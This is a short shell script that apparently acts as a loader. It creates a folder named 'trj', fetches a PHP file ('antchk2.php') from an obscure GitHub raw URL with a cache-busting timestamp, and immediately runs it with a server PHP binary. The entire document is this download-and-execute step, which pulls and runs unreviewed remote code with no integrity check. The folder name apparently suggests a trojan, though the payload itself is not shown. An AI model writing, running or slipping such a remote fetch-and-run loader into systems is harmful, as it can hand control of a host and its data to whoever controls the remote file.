#!/bin/sh
D=$HOME/trj; mkdir -p "$D"; cd "$D" || exit 1
curl -fsSL -o antchk2.php.new "https://raw.githubusercontent.com/a04032417-svg/Dar101/trj/trj/antchk2.php?t=$(date +%s)" && mv antchk2.php.new antchk2.php
/opt/alt/php83/usr/bin/php antchk2.php "$1"
